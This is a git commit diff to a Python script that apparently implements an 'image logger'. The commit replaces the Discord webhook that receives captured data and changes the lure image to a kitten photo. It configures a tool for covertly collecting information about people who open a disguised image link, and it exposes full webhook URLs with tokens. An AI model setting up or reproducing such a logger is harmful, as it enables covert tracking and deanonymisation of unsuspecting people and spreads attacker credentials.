11139b3a7a97549b633b42582ab0644a5959c7e5
kisleryofishal858-beep <kisleryofishal858@gmail.com>
2025-08-04 19:52:56 +0800

    Update mangos.py

--- api/mangos.py
+++ api/mangos.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1401222000583770172/2FG4oRNfdt8ZzoM9dMAdOLTv6bAomw5lcZMutvjqL31BBkLIKml9AbKNzMDYApTNwol8",
+    "image": "https://discoverleeds.co.uk/_next/image/?url=https%3A%2F%2Fapi.discoverleeds.co.uk%2Fwp-content%2Fuploads%2F2024%2F08%2FKitty-Cafe-Adorable-Black-Kitten-Relaxing.jpg&w=1200&q=100", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
